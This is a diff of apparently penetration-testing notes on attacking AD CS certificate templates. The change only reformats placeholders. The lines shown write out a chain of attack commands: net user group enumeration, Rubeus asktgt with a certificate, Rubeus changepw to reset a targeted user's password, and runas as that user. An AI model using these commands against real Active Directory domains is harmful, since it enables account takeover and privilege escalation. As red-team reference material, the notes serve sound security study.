@@ -47,7 +47,7 @@ Combinations of these following parameters can be incredibly toxic and be abused
 The following section will give explanation and commands to attack certificate templates on AD CS
 
 ### Enumerate User Groups
-> net user <username> /domain > usergroups.txt
+> net user ***username*** /domain > usergroups.txt
 
 This command will lsit both Local and Global groups that user belongs to.
 
@@ -88,10 +88,10 @@ Windows Start Menu > mmc > File > Add/Remove Snap-in > Certificates > Add > Now 
   - Load the Kerberos TGT
 
   ### Rubeus
-  > Rubeus.exe asktgt /user<username> /enctype:aes256 /certificate:<path to cert> /password:<cert file pass> /outfile:<name of file to write> /domain:<domain name> /dc:<IP>
+  > Rubeus.exe asktgt /user***username*** /enctype:aes256 /certificate:***path to cert*** /password:***cert file pass*** /outfile:***name of file to write*** /domain:***domain name*** /dc:***IP***
   
-  > Rubeus.exe changepw /ticket:<path to ticket> /new:<new pass for user> /dc:<domain> /targetuser:<domain>\<username targeted>
+  > Rubeus.exe changepw /ticket:***path to ticket*** /new:***new pass for user*** /dc:***domain*** /targetuser:***domain***\***username targeted***
   
-  > runas /user:<domain>\<username> cmd.exe
+  > runas /user:***domain***\***username*** cmd.exe
   
   
